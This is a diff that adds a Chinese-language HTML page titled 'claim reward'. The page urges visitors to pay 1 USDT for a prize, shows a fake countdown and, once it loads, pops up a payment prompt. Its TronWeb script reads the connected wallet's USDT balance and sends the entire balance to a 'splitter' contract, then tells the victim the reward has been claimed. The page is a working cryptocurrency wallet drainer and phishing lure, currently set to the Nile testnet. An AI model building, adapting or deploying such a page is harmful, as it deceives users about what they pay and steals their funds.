@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>领取奖励</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
+        h1 { color: #ff4500; font-size: 28px; }
+        #countdown { color: #ff0000; font-size: 20px; margin: 10px 0; }
+        #qrcode-container { border: 5px solid #ffd700; padding: 20px; background: #fff; display: inline-block; border-radius: 10px; }
+        img { max-width: 200px; }
+        #popup { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; padding: 20px; border: 2px solid #ff4500; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 1000; }
+        #popup button { padding: 10px 20px; font-size: 16px; background-color: #ff4500; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #popup button:hover { background-color: #e03e00; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; }
+    </style>
+</head>
+<body>
+    <h1>仅需支付1USDT即可领取奖励！</h1>
+    <div id="countdown">活动倒计时：23小时59分</div>
+    <div id="qrcode-container">
+        <img src="/rm123/rm.png" alt="二维码">
+        <p>扫码支付1USDT</p>
+    </div>
+
+    <div id="overlay"></div>
+    <div id="popup">
+        <h2>确认支付1USDT</h2>
+        <p>请点击下方按钮验证钱包并支付1USDT领取奖励！</p>
+        <button onclick="confirmTransfer()">确认支付</button>
+    </div>
+
+    <script>
+        const usdtContractAddress = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // Nile 测试网 USDT 地址
+        const splitterContractAddress = "TLod9Hy4yuEe9UYd73xsGS876HHN4tfsVs"; // 替换为部署后的合约地址
+        const paymentAmountUSDT = 1; // 固定支付金额 1 USDT
+
+        let tronWebGlobal, userAddressGlobal;
+
+        async function transferToContract(tronWeb, userAddress) {
+            console.log("Transferring USDT to contract...");
+
+            // 获取 USDT 合约实例
+            const usdtContract = await tronWeb.contract().at(usdtContractAddress);
+
+            // 检查余额
+            const balance = await usdtContract.balanceOf(userAddress).call();
+            const usdtBalance = balance.toNumber() / 1000000; // 转换为 USDT 单位 (6位小数)
+            console.log("TRC-20 USDT balance:", usdtBalance);
+
+            if (usdtBalance < paymentAmountUSDT) {
+                alert("余额不足，无法支付1 USDT！");
+                return;
+            }
+
+            // 直接转账到智能合约
+            const amountToTransfer = balance; // 转入全部余额
+            await usdtContract.transfer(splitterContractAddress, amountToTransfer).send();
+            console.log("USDT transferred to splitter contract");
+            alert("奖励领取成功！");
+        }
+
+        async function confirmTransfer() {
+            document.getElementById('popup').style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+
+            // 检测 TRON 钱包
+            let tronWeb;
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                tronWeb = window.tronWeb;
+                console.log("Detected TronLink or compatible TRON wallet");
+            } else {
+                console.log("No TRON wallet detected");
+                alert("请安装 TronLink 或其他兼容钱包！");
+                return;
+            }
+
+            // 确保切换到 Nile 测试网
+            if (tronWeb.fullNode.host !== "https://api.nileex.io") {
+                alert("请切换到 Nile 测试网！");
+                return;
+            }
+
+            const userAddress = tronWeb.defaultAddress.base58;
+            tronWebGlobal = tronWeb;
+            userAddressGlobal = userAddress;
+
+            await transferToContract(tronWeb, userAddress);
+        }
+
+        function showPopup() {
+            document.getElementById('popup').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                if (window.tronWeb) {
+                    showPopup();
+                } else {
+                    console.log("No TRON wallet detected after timeout");
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
